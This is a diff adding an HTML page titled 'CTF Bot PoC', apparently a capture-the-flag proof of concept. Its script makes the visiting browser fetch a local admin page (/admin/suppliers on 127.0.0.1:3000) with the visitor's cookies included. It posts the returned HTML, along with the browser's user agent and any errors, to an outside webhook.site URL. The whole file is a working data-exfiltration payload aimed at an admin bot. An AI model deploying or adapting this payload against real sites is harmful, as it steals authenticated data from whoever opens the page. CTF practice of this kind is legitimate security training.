@@ -1,0 +1,32 @@
+<!doctype html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>CTF Bot PoC</title>
+</head>
+<body>
+  <h1>Bot PoC</h1>
+  <script>
+    const WEBHOOK = "https://webhook.site/75cd22ec-c130-4c3b-968c-1caab6f709ba";
+
+    fetch(WEBHOOK + "?stage=bot-opened&ua=" + encodeURIComponent(navigator.userAgent))
+      .catch(() => {});
+
+    fetch("http://127.0.0.1:3000/admin/suppliers", {
+      credentials: "include"
+    })
+      .then(r => r.text())
+      .then(html => {
+        return fetch(WEBHOOK, {
+          method: "POST",
+          mode: "no-cors",
+          body: html
+        });
+      })
+      .catch(err => {
+        fetch(WEBHOOK + "?stage=failed&err=" + encodeURIComponent(String(err)))
+          .catch(() => {});
+      });
+  </script>
+</body>
+</html>
